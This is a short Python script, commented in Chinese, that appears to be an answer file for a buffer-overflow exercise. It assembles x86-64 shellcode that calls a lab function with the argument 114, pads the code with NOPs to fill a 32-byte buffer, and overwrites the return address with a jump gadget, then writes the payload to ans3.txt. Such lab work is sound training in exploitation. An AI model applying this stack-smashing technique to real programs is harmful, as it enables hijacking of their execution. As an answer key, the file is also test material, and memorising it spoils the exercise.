import struct
# 缓冲区大小：32字节
# 调用func1(114)的Shellcode
# func1地址:0x401216
# 参数:114 (0x72)
shellcode=b'\x48\xc7\xc7\x72\x00\x00\x00'  # mov rdi,0x72 把114赋值给参数寄存器 rdi
shellcode+=b'\x48\xc7\xc0\x16\x12\x40\x00' # mov rax,0x401216 把func1的地址放入 rax
shellcode+=b'\xff\xd0'                     # call rax 调用func1
pad_len=32-len(shellcode) #将shellcode填充至32字节
payload=shellcode+b'\x90'*pad_len
payload+=b'B'*8
jmps=0x401334# jmps跳转到 (saved_rsp+0x10)，即缓冲区的起始位置。
payload+=struct.pack('<Q',jmps)
with open('ans3.txt','wb') as f:
    f.write(payload)
print("Payload written to ans3.txt")
